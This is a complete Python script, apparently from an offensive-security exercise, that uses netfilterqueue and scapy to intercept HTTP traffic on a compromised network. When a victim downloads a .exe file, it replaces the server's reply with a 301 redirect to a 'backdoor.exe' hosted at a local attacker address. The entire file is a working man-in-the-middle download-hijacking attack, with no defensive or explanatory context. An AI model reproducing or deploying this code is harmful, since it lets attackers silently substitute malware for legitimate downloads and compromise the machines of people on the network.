from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []

def set_payload(packet):
    if packet.haslayer(scapy.Raw):
        del packet[scapy.Raw]

    packet = packet / scapy.Raw(
        load=b"HTTP/1.1 301 Moved Permanently\r\nLocation: http://192.168.1.8/backdoor.exe\r\n\r\n")

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:
                print("Exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("Exe Response")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_payload(scapy_packet)
                packet.set_payload(bytes(modified_packet))
    packet.accept()

queue = NetfilterQueue()
queue.bind(1, process_packet)
print("Starting... Run iptables rules first!")
queue.run()